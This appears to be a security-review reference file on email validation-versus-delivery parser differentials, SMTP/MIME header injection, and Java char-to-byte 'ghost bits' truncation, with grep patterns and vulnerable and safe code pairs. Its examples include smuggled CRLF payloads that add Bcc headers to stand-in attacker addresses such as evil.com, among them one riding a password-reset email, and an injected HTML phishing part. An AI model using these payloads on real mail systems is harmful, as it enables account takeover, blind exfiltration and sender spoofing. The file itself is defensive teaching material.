---
name: email_parser_differential
version: "0.4"
description: Email validation-vs-parsing differential — app validates with regex or split('@') but the mail-sending library parses encoded-words, comments, quoted strings, multiple @, Punycode/IDN, or UUCP paths differently, so stored domain differs from delivery target; plus identity-key collisions from missing canonicalization; plus outbound email/SMTP header injection and MIME multipart-boundary injection (CRLF into From/Reply-To/Cc/Bcc/Subject, or a static boundary → Bcc exfiltration, From spoofing, injected text/html part or attachment); plus char→byte truncation ("ghost bits" / Cast Attack) that re-materializes CR/LF on the wire *after* a string-level CRLF filter when a custom char→byte serializer (e.g. (byte) c, writeBytes, write(int)) produces the header/command bytes — U+010D→CR, U+010A→LF (Angus Mail CVE-2025-7962 family); plus the "already-sanitised" trap where an HTML sanitizer/escaper on the path (wp_kses/wp_kses_post/wp_strip_all_tags/strip_tags/htmlspecialchars/esc_html) is mistaken for a CRLF filter — it strips HTML, not CR/LF, so a value concatenated into a wp_mail() $headers / Content-Type header line still injects (Essential Addons for Elementor CVE-2026-15155); CWE-179 / CWE-180 / CWE-93 / CWE-20 / CWE-697
---

# Email Parser Differential (CWE-20 / CWE-697)

Applications often validate email addresses with a simple regex, a lone `@` check, or `split('@')`, then pass the **same string** to an SMTP client, transactional mailer, or cloud mail API. Mail libraries and MTAs parse RFC 5322/5321 syntax more permissively: encoded-words (`=?utf-8?...?=`), parenthetical comments, quoted local parts, multiple `@` signs, Punycode/IDN domains, UUCP/bang paths, and embedded control characters (`NUL`, `CRLF`). The application may record `user@victim.com` while the mailer delivers to `attacker.com` — enabling verification-email hijack, password-reset takeover, or invite redirection. A related failure uses email as a unique identity key without canonicalization (case, `+` tags, dot semantics, Unicode confusables), producing duplicate or colliding accounts.

## What It Is / Is Not

- **Is**: validate with `EMAIL_REGEX` / `indexOf('@')` / `split('@')` then send via `mailer.send`, `sendmail`, SMTP client, SES, SendGrid, etc.; stored email used as login/verification key without normalize/canonicalize step; comparison against "verified email" uses raw string equality after different parsing paths.
- **Is not**: generic input validation on non-email fields — standard injection classes. OAuth `email_verified` claim trust — see `oauth_oidc_misconfiguration.md`. (Outbound **email/SMTP header injection** and **MIME-part injection** — CRLF or a static boundary in the mail-send path — are **in scope here**; they share this file's send-path sinks and are covered in their own section below. Reserve `log_injection.md` for CRLF into *logs* and `http_response_splitting.md`/`smuggling_desync.md` for CRLF into *HTTP* responses — neither covers the email side.)
- **Highest signal** where `validate_email`, `EMAIL_REGEX`, or `split('@')` appears in the same module or call chain as `send_mail`, `smtp`, `mailer.send`, `ses.send`, or `normalizeEmail` absent upstream of DB uniqueness constraint.

## Source -> Sink Pattern

**Sources**
- Registration/login/invite forms: `email`, `user_email`, `recipient`
- Profile update, team invite, billing contact fields
- Password-reset and magic-link request handlers

**Validation sink (weak — creates false confidence)**
- `re.match(EMAIL_REGEX, email)`, `email.includes('@')`, `email.split('@')`, `validator.isEmail(email)` with library A
- Custom check: `parts = email.split('@'); domain = parts[1]` used for policy decisions

**Delivery sink (authoritative parser)**
- Python: `smtplib`, Django `send_mail`, `email.utils.parseaddr`, `flask-mail`
- Node: `nodemailer.sendMail`, `@sendgrid/mail`, `aws-sdk SES.sendEmail`
- Java: `InternetAddress.parse`, JavaMail `Transport.send`
- Ruby: `Mail.deliver`, ActionMailer
- Go: `net/mail.ParseAddress`, `smtp.SendMail`

**Identity sink (collision / takeover)**
- DB unique index on raw `email` column without canonical form
- `User.findOne({ email: input })` before verification completes
- Account merge/link keyed on unnormalized email — see `business_logic.md`

**Aggravating differential examples**
- `"attacker@evil.com"@victim.com` — quoted local part; app split sees domain `victim.com`, parser delivers to `attacker@evil.com`
- `user@attacker.com@victim.com` — multiple `@`; regex may pass, MTA uses rightmost domain
- `user@victim.com (comment)@attacker.com` — comment stripping changes interpretation
- `=?utf-8?q?user?=@attacker.com` — encoded-word in local part
- `user@victim.com%0aBcc:attacker@evil.com` — CRLF in header context
- `user@xn--…` (IDN homograph) vs visually identical Unicode domain

## Recon Indicators (Grep)

```bash
# Weak validation patterns
rg -ni 'validate_email|validateEmail|EMAIL_REGEX|EMAIL_PATTERN|is_valid_email|check_email' .
rg -ni "split\s*\(\s*['\"]@['\"]|\.split\s*\(\s*['\"]@['\"]|indexOf\s*\(\s*['\"]@['\"]" .
rg -ni 'validator\.isEmail|validate\.format.*email|email.*regex|regex.*email' .

# Mail send / SMTP sinks (trace whether same string bypasses canonicalization)
rg -ni 'send_mail|sendmail|mailer\.send|smtp\.|SMTP\(|Transport\.send|sendMail|ParseAddress|parseaddr|SES\.|send_email|deliver_mail' .

# Identity / uniqueness without normalization
rg -ni 'normalizeEmail|canonicalize.*email|email\.toLowerCase|lower\(email\)|idna|punycode|to_ascii' .
rg -ni 'unique.*email|email.*unique|findOne.*email|find_by.*email|User\.where.*email' .

# Verification / reset flows (high impact)
rg -ni 'verify.*email|email.*verif|password.*reset|magic.*link|confirmation.*mail' .
```

For each hit: does validation use the **same parser** as delivery? Is a canonical form computed **before** DB insert and uniqueness check?

## Vulnerable Conditions

1. **Regex/split validation + different send library**: validation rejects some bad input but accepts strings the MTA parses to a different mailbox.
2. **Domain extracted via split**: security decision (`allowed_domain`, SSO domain lock) uses `split('@')[1]` while sender uses full RFC parser.
3. **No rejection of encoded-words, comments, quoted strings, or multiple `@`** in validation layer.
4. **Email as unique key**: insert `User(email=request.email)` with case-sensitive or unnormalized column; `User+tag@` and `user@` collide or duplicate.
5. **Verification compare mismatch**: token bound to normalized display email but sent to parser-normalized different address.
6. **Unicode confusables**: Cyrillic `а` vs Latin `a` in domain; no IDNA/punycode normalization before equality.
7. **Plus-address / dot semantics**: Gmail-style `user+tag@domain` treated as distinct accounts without provider-aware canonicalization (product-dependent — flag when uniqueness is security-critical).
8. **DB-collation casting vs MTA exactness (0-click reset ATO)**: the lookup compares emails through a case/accent-insensitive **database collation** (e.g. MySQL `utf8mb4_general_ci`/`_0900_ai_ci`) that **casts distinct Unicode code points to the same ASCII letter** (a confusable "a" equals plain `a` in a `WHERE email = ?`), so the attacker's `vićtim@…`-style address *matches the victim's row* — but the reset/verification mail is then sent to the **user-supplied** (literally different) address, delivering the victim's token to the attacker's mailbox. The dual of #6: here the collation makes unequal strings compare *equal*. Same risk when an IdP returns a punycoded/Unicode `email` claim that the app looks up under a casting collation (OAuth email-trust). **SAFE**: after the lookup, send only to the **stored verified address from the matched row** (never echo the request input into the recipient), and/or use a binary/`utf8mb4_bin` comparison for the identity column. **Grep seeds**: `WHERE email =`/`find_one(email=` immediately followed by `send_*`/`mailer` using the *request* value; `*_general_ci`/`*_ai_ci` collation on an email/login column.

## Email header & MIME-part injection (CRLF / boundary) — CWE-93

Same send path, **different root cause** from the delivery-target differential above: here the question is not *which mailbox receives* the message but **what headers and body parts the sender controls**. Any user field concatenated into a header line or into a hand-built MIME body — without stripping `\r`/`\n` (and, for multipart, without a random per-message boundary) — lets the attacker inject headers or whole new MIME parts. The two classes frequently coexist on one handler; report both.

**Sinks — the danger is raw string assembly, not the transport:**
- **PHP**: `mail($to, $subject, $body, $additional_headers)` — the 4th arg **and** `$to`/`$subject` are injectable; PHP does **not** neutralize CRLF you concatenate into `$headers`. Also `mb_send_mail`.
- **WordPress**: `wp_mail($to, $subject, $message, $headers)` — plugins build the `$headers` string with raw concatenation. The injectable field is frequently a **`Content-Type:`/charset value** that *looks* like a fixed `html`/`plain` option, **not** an obvious recipient/subject, and the header line usually already ends in `"\r\n"` — so **one** stored CRLF adds a whole new header (`Bcc:`). WP superglobals/settings are not auto-CRLF-stripped.
- **Python**: manual `"Subject: %s\r\n" % x` / `"To: %s" % x` joined into a raw string handed to `smtplib.SMTP.sendmail(from, to, raw)` — this **bypasses** the `email` package's own header guards.
- **Java**: `MimeMessage.addHeader(name, value)` / `setHeader` / `InternetHeaders` built from raw user strings.
- **Node**: nodemailer `headers: {...}` / `raw:` with unescaped values; any templated RFC822 string.
- **Ruby**: ActionMailer `headers[...] =` / `mail(to:, subject:)` fed unsanitized input.

**Four impacts — the first three are caught readily; #4 is the commonly-missed variant:**
1. **Recipient injection** — CRLF + `Bcc:`/`Cc:` turns the endpoint into a spam / blind-exfiltration relay (copy every message to attacker addresses) **even when the visible `To` is fixed**.
2. **`From:` / `Reply-To:` spoofing** — inject or override the sender identity → phishing that renders as the trusted brand and is auto-trusted (auto-loaded images, allowlisted sender) by the receiving mailbox.
3. **`Subject:` / arbitrary-header injection.**
4. **MIME multipart-boundary injection (commonly missed).** When the body is a hand-built `multipart/*` with a **predictable or static boundary constant** and a user field is concatenated into a part, the attacker embeds the boundary delimiter + `\r\n` + their own part headers to **inject an entire new MIME part** — e.g. add a `Content-Type: text/html` part to an otherwise text-only message, or a `Content-Disposition: attachment` file — overriding the message the app intended. This works **even on a `text/plain`-only message** and is **independent of HTML-escaping** the existing parts (so "I escaped the HTML part" does not fix it). The **static boundary is the code smell**: `$boundary = "----=_App_Part"` (constant) instead of a per-message random value.

**Grep seeds:**
```bash
rg -n "mail\s*\(|mb_send_mail|wp_mail\s*\(" .                      # PHP/WP mail() sinks ($to/$subject/$headers)
rg -n "(wp_kses|wp_kses_post|wp_strip_all_tags|strip_tags|htmlspecialchars|htmlentities|esc_html|esc_attr)\s*\([^)]*\)\s*\.\s*['\"].*(Content-Type|charset|\\\\r\\\\n)" . # HTML filter output concatenated into a header line -> still CWE-93
rg -n "sendmail\(|\.sendmail\(|['\"]Subject:\s*%s|['\"]To:\s*%s" . # Python raw RFC822 -> smtplib
rg -n "addHeader\(|setHeader\(|headers\[|['\"](Bcc|Cc|Reply-To):" . # raw header assembly
rg -n "boundary\s*=\s*['\"][^'\"]+['\"]|--=?_?[A-Za-z]" .          # static/predictable multipart boundary
```
For each header/body assembly ask: is **every** interpolated value stripped of `\r`/`\n`/`\0` (or set via a header-safe library API), and is the multipart boundary **generated per message (random)** rather than a constant?

```php
// VULN — user fields concatenated into headers + static multipart boundary
$headers  = "From: {$name} <{$email}>\r\n";       // CRLF in $name -> From/Bcc header injection
if ($copyMe) { $headers .= "Cc: {$copyMe}\r\n"; }  // CRLF in $copyMe -> recipient (Bcc) injection
$boundary = "----=_App_Part";                       // static boundary -> MIME-part injection
$body  = "--{$boundary}\r\nContent-Type: text/plain; charset=UTF-8\r\n\r\n{$note}\r\n--{$boundary}--\r\n";
mail($to, "Hi {$name}", $body, $headers);           // $to, $subject, and $headers all injectable
// note = "x\r\n--=_App_Part\r\nContent-Type: text/html\r\n\r\n<form>...phish...</form>\r\n--=_App_Part--"
//   -> attacker injects a whole new text/html part even though the intended part was text/plain

// SAFE — reject CRLF on every header/body field, fixed From, per-message random boundary (or a library)
foreach ([$name, $copyMe, $note, $topic] as $v) {
    if (preg_match('/[\r\n\x00]/', $v)) { http_response_code(400); exit('invalid input'); }
}
$from     = $config['from_address'];                // fixed sender; user address only in a validated Reply-To
$boundary = '=_' . bin2hex(random_bytes(16));       // unguessable per-message boundary
// best: PHPMailer / Symfony Mailer with setFrom()/addCc()/Subject()/Body — structured setters reject header CRLF
```

## "It's already sanitised" trap — an HTML sanitizer/escaper is **not** a CRLF filter (CWE-93 still stands)

A value that reaches a mail (or HTTP) header line **after** passing through an HTML sanitizer or output escaper is **still injectable**. Do **not** treat the filter as neutralizing the header sink, and do **not** clear or downgrade the finding on that basis — **a wrong-context sanitizer on a header/CRLF sink is itself the finding**, exactly as a wrong-context escaper is still XSS. HTML filters strip/encode *tags, attributes, and protocols*; they leave `\r`, `\n`, and `\0` **untouched** because those are not HTML, so a tag-free payload (`html\r\nBcc: attacker@evil.com`) passes through unchanged and splits the header line.

**Not CRLF sanitizers** (commonly mistaken for one when they sit on a header path): `wp_kses`, `wp_kses_post`, `wp_strip_all_tags`, `strip_tags`, `htmlspecialchars`/`htmlentities`, `esc_html`/`esc_attr`/`esc_textarea`, and any HTML-entity / Markdown / BB-code encoder. **What actually neutralizes header injection**: reject/strip `\r\n\0` (a `preg_match('/[\r\n\x00]/', $v)` guard, or a newline-stripping sanitizer such as WP `sanitize_text_field`), an **allowlist of fixed values**, or a **structured mailer API** (PHPMailer / Symfony Mailer / `MimeMessage` setters) that rejects header CRLF.

```php
// VULN — value flows through an HTML sanitizer, then into a Content-Type header line ending in \r\n (wp_mail)
$ct = Helper::eael_wp_kses( $settings['lostpassword_email_content_type'] ); // wp_kses wrapper: strips HTML, keeps \r\n
$headers = 'Content-Type: text/' . $ct . '; charset=UTF-8' . "\r\n";        // stored value = "html\r\nBcc: attacker@evil.com"
wp_mail( $user->user_email, $subject, $message_with_valid_reset_key, $headers );
//   -> the injected Bcc rides the admin's password-reset email; attacker receives the reset link => account takeover
//   (Essential Addons for Elementor, CVE-2026-15155 — Contributor -> admin ATO)
```

The setting *looks* safe because the editor UI offers it as a two-option `html`/`plain` dropdown — but that `SELECT` is enforced **client-side only**; the server re-reads the stored document value and trusts it, and a low-privilege user who can edit the page-builder document controls it (see the client-side-enum / stored-setting note in `input_validation.md`). The same "HTML-escaped, therefore safe" mistake applies to CRLF built into **HTTP** headers/redirects — see `http_response_splitting.md` / `open_redirect.md`.

## Ghost-bits: char→byte truncation re-materializes CR/LF *after* a string-level filter (CWE-179 / CWE-180)

A string-level CRLF/NUL check — `assertSingleLine(v)`, `preg_match('/[\r\n\x00]/', $v)`, `value.indexOf('\n') >= 0`, "reject `U+2028`/`U+2029`/NEL" — is **not sufficient** when the header or SMTP-command bytes are produced by a **custom char→byte serializer** downstream of the check. Java's `char` is 16-bit; narrowing it to a `byte` keeps only the **low 8 bits** — the discarded high byte is the *"ghost bits"* (a.k.a. **Cast Attack**, Black Hat Asia 2026, `@ptdbugs`). A code point that is **not** `\r`/`\n` *as a char* (so it sails through the filter) collapses to a **structural ASCII byte** on the wire:

- `U+010D` (`č`) → `0x0D` **CR**, `U+010A` (`Ċ`) → `0x0A` **LF** → a `subject`/`name`/`Reply-To` validated as "single line" injects `\r\n` + new headers (`Bcc:`/`Cc:`/`From:`) or SMTP verbs (`\r\n.\r\nMAIL FROM:…`) **at serialization time**. Any `U+xx0D`/`U+xx0A` works (`U+020D`, `U+966A`→`0x6A` `j`, `U+962E`→`0x2E` `.`), so the same primitive also drives **file-upload extension bypass** (`1.陪sp`→`1.jsp`) and **path traversal** (a code point whose low byte is `0x2E`→`.` / `0x2F`→`/`).

**This is a validate-vs-serialize differential**: the guard runs on the pre-truncation `String`; the injection is born in the `char → byte` narrowing that the guard never sees. It is the byte-level twin of the address-parser differential above.

The canonical real-world sink is `org.eclipse.angus.mail.util.ASCIIUtility#getBytes` (**CVE-2025-7962**, `bytes[i] = (byte) chars[i]`), reached transitively through Jira / Confluence / Bitbucket / Keycloak / TeamCity — abused to inject SMTP commands and send DKIM/SPF-valid phishing from the victim's own mail backend.

**Sinks to grep for (the char→byte narrowing on the mail/header send path):**
- `(byte) c` / `bytes[i] = (byte) chars[i]` looping over a `char[]`/`String`
- `OutputStream.write(int)` / `ByteArrayOutputStream.write(c)` with a **char-typed** argument (the `int` overload writes only the low byte)
- `DataOutputStream.writeBytes(String)`, `RandomAccessFile.writeBytes(String)` — both keep only the low byte of each char (documented lossy)
- deprecated `String.getBytes(int, int, byte[], int)`, `java.io.StringBufferInputStream`
- `c & 0xff` masking, `table[c & 0xff]` / `table[(byte) c]` lookup indexing (Base64/hex encoders)
- `Integer.parseInt(seq, radix)` inside a `\u`/`\x`/`%`-escape decoder (accepts non-ASCII Unicode digits, then truncates)

```bash
rg -n "\(byte\)\s*\w|\.writeBytes\s*\(|getBytes\s*\(\s*\d|StringBufferInputStream|&\s*0x[fF]{2}\b" --glob '*.java'
```

**Why the usual fixes miss it:** a `\r`/`\n`/`\0` strip on the `String`, a `replace("\r\n.", "\r\n..")` dot-stuff, and blocking `U+2028`/`U+2029`/NEL all operate on the **pre-truncation** string — none see the CR/LF that `(byte) c` synthesizes from `U+010D`/`U+010A`. Blocking `U+2028`/`U+2029` is also the **wrong axis**: those truncate to `0x28`/`0x29` (`(`/`)`), never to a newline — a reviewer proposing them has mis-modeled the sink.

**SAFE — validate the *byte* representation, not the char string:**
```java
// VULN — CRLF guard on the String, but a custom char→byte serializer emits the bytes
static void assertSingleLine(String v){ if (v.indexOf('\r')>=0 || v.indexOf('\n')>=0) throw new IllegalArgumentException(); }
static byte[] toAscii(String s){ byte[] b=new byte[s.length()]; for(int i=0;i<s.length();i++) b[i]=(byte) s.charAt(i); return b; }
// subject "Weekly\u010D\u010ABcc: exfil@evil.com" passes assertSingleLine, toAscii emits "Weekly\r\nBcc: exfil@evil.com"

// SAFE — reject any non-ASCII code point *before* the cast (closes the ghost-bits gap)
static void assertHeaderSafe(String v){
    for (int i=0;i<v.length();i++){ char c=v.charAt(i);
        if (c=='\r'||c=='\n'||c=='\0'||c>0x7F) throw new IllegalArgumentException(); }
}
// or encode through a strict charset: US-ASCII with a CharsetEncoder set to CodingErrorAction.REPORT
//   (unmappable / >0x7F chars raise instead of silently truncating)
// best: set headers via a structural mailer API — MimeMessage.setSubject / InternetAddress — which
//   both RFC 2047-encodes non-ASCII AND rejects embedded control bytes.
```

Cross-cutting: the same char→byte ghost-bits primitive feeds **HTTP request smuggling / CRLF** via custom header buffers (`smuggling_desync.md`), **path traversal / LFI** (`path_traversal_lfi_rfi.md`), **file-upload extension bypass** (`arbitrary_file_upload.md`), and WAF/SQLi/XSS filter bypass. The primitive is Java-specific (16-bit `char` → 8-bit `byte`), but the "high code point → low structural byte" idea recurs elsewhere — see the Node.js ≤8 Unicode→latin1 CRLF variant in `ssrf.md`.

## Vulnerable vs Safe Code Examples

```python
# VULN — regex validation; smtplib parses differently
EMAIL_REGEX = r'^[^@]+@[^@]+\.[^@]+$'
def register(email):
    if not re.match(EMAIL_REGEX, email):
        raise ValueError("invalid")
    User.create(email=email)
    send_mail(to=email, subject="Verify", body=link_for(email))

# SAFE — parse with same library as send; canonicalize before store/send
from email.utils import parseaddr
import idna

def canonical_email(raw: str) -> str:
    _, addr = parseaddr(raw)
    if not addr or addr.count('@') != 1:
        raise ValueError("invalid")
    local, domain = addr.rsplit('@', 1)
    if any(c in local + domain for c in '\r\n\0'):
        raise ValueError("invalid")
    if '=?' in local or '((' in addr:
        raise ValueError("invalid")
    domain = idna.encode(domain.strip().lower()).decode('ascii')
    return f"{local.lower()}@{domain}"

def register(email):
    addr = canonical_email(email)
    User.create(email=addr)
    send_mail(to=addr, subject="Verify", body=link_for(addr))
```

```javascript
// VULN — split('@') domain check; nodemailer accepts quoted/multiple @ forms
function isAllowedEmail(email) {
  const [, domain] = email.split('@');
  return domain === 'corp.example.com';
}
async function invite(email) {
  if (!isAllowedEmail(email)) throw new Error('denied');
  await transporter.sendMail({ to: email, subject: 'Invite', text: '...' });
}

// SAFE — use mail parser; canonicalize; compare verified address only
const { addressparser } = require('nodemailer/lib/addressparser');
function canonicalEmail(raw) {
  const parsed = addressparser(raw);
  if (parsed.length !== 1) throw new Error('invalid');
  const addr = parsed[0].address;
  if (!addr || (addr.match(/@/g) || []).length !== 1) throw new Error('invalid');
  const [local, domain] = addr.toLowerCase().split('@');
  return `${local}@${domain.normalize('NFKC')}`;
}
```

```python
# VULN — account lookup on raw email; attacker registers user+attacker@domain
def reset_password(email):
    user = User.find_one(email=email)
    if user:
        send_reset(user.email, token=make_token(user))

# SAFE — lookup canonical form; send only to verified_email field
def reset_password(email):
    addr = canonical_email(email)
    user = User.find_one(canonical_email=addr)
    if user and user.email_verified:
        send_reset(user.verified_email, token=make_token(user))
```

```java
// VULN — simple @ check; InternetAddress parses comments/group syntax
if (!email.contains("@")) throw badRequest();
transport.sendMessage(new MimeMessage(session) {{ setRecipient(TO, new InternetAddress(email)); }});

// SAFE — InternetAddress for both validation and send; strict
InternetAddress addr = new InternetAddress(email, true);
addr.validate();
String canonical = addr.getAddress().toLowerCase(Locale.ROOT);
```

## Safe Patterns

- **Single parser**: validate and send with the **same** RFC-aware parser (`parseaddr`, `InternetAddress`, `mail.ParseAddress`, nodemailer address parser).
- **Canonicalize before store**: lowercase local part (unless provider policy forbids); IDNA/punycode-encode domain; reject control chars, comments, encoded-words, multiple `@`, and angle-address anomalies.
- **Uniqueness on canonical column**: unique index on `canonical_email`; never on raw display input alone.
- **Verification binding**: issue tokens tied to canonical address; complete verification only when link clicked from mailbox that matches stored canonical form.
- **High-risk actions**: password reset, invite acceptance, billing receipts — send only to `verified_email`, not latest profile edit.
- **Confusables**: optional block on mixed-script domains; normalize Unicode before IDNA.
- **Compare verified only**: account recovery and SSO link use `email_verified === true` address — see `business_logic.md` for lifecycle flaws.
- **Header-safe assembly**: never concatenate user input into header lines or a hand-built MIME body — use a mailer that sets headers structurally (which rejects CRLF), strip `\r`/`\n`/`\0` from any value that reaches a header, and use a random per-message multipart boundary.

## Severity / Triage

| Condition | Typical severity |
|-----------|------------------|
| Parser differential on verification/reset/invite send | **Critical** — account takeover |
| Parser differential on marketing/low-risk mail | **Medium** |
| Missing canonicalization on unique email constraint | **High** — duplicate accounts, auth bypass |
| Unicode homograph in domain without IDNA normalize | **High** (context-dependent) |
| CRLF header injection (Bcc/Cc/From/Reply-To/Subject) on any send path | **High** — spam relay, blind-copy exfiltration, sender spoofing |
| MIME-part injection via static/predictable multipart boundary | **High** — inject a `text/html` part or attachment into trusted mail |
| Ghost-bits char→byte truncation defeats a string-level CRLF/header filter (custom `(byte) c` / `writeBytes` / `write(int)` serializer in the send path) | **High** — CRLF header / SMTP-command injection, DKIM/SPF-valid phishing (CVE-2025-7962 family) |
| Regex stricter than sender ( rejects attacker input ) | **Info** — verify sender path not alternate |
| Same library parse + canonicalize + verified-only send | **FALSE POSITIVE** |

Downgrade when: one canonicalization function feeds validation, persistence, and delivery; verified-email gate on sensitive sends.

## Common False Alarms

- Validation and send both use strict `InternetAddress` / `parseaddr` with `validate()` and no raw string bypass.
- Email field rejected unless exactly one `@`, no quotes/comments, and domain is IDNA-normalized before insert.
- Marketing alias accepts `+tag` but auth uniqueness uses provider-canonicalized form consistently.
- Framework validator (Django `EmailValidator`) immediately followed by same normalized value to `send_mail` without re-reading raw request — confirm no intermediate concatenation.
- Disposable-domain blocklist only — not a differential fix; still flag if parser differential exists on verification path.
- **Header set via a header-safe library API**, not raw concatenation: PHPMailer / Symfony Mailer / SwiftMailer `setFrom()`/`addCc()`/`Subject()`, Python `email.message.EmailMessage` with `msg['To'] =` (raises on embedded newlines), JavaMail `setRecipients`, Go `net/mail` — these reject CRLF in header values, so no header injection unless the code bypasses them with a raw string.
- **Multipart body with a cryptographically random per-message boundary** and parts emitted through a library encoder (quoted-printable/base64) — the boundary cannot be forged from body content, so not MIME-injectable. Only flag when the boundary is a **constant/predictable** literal.
- **Ghost-bits: header set via a structural mailer API, OR the send path validates the byte range** — non-ASCII rejected (`c > 0x7F` / `!Character.isAscii(c)`) *before* any `(byte)` cast, or `getBytes(US_ASCII)` with `CodingErrorAction.REPORT`. Then char→byte truncation cannot synthesize CR/LF. Only flag the char→byte primitive when a **string-level** CRLF/NUL check is the *only* guard **and** a custom char→byte serializer (`(byte) c`, `writeBytes`, `write(int)`) produces the header/command bytes downstream. A proposed payload of `U+2028`/`U+2029`/NEL against such a serializer is a **false lead** (those truncate to `0x28`/`0x29`/`0x85`, not newlines).

## Cross-References

- `business_logic.md` — account lifecycle, invite/verification workflow bypass, duplicate account creation.
- `oauth_oidc_misconfiguration.md` — trusting IdP `email` without `email_verified` on link/create.
- `authentication_jwt.md` — email claim in tokens used for authorization.
- `log_injection.md` — CRLF into **logs** (orthogonal); `http_response_splitting.md` / `smuggling_desync.md` — CRLF into **HTTP** responses. This file owns CRLF into **email headers / MIME body**.
- `smuggling_desync.md` / `path_traversal_lfi_rfi.md` / `arbitrary_file_upload.md` — the same char→byte "ghost bits" truncation primitive (Cast Attack) applied to HTTP header/request-line buffers, path decoders, and upload-filename bytes; `ssrf.md` — the Node.js Unicode→latin1 CRLF variant.
- `privacy_data_protection.md` — PII handling for email in logs and exports.

## Core Principle

Email validation must use the **same canonical parser** as the mail-sending path: normalize once, store the canonical form, enforce uniqueness on that form, and perform verification, reset, and invite delivery only to **verified** canonical addresses — never assume regex or `split('@')` matches MTA behavior.
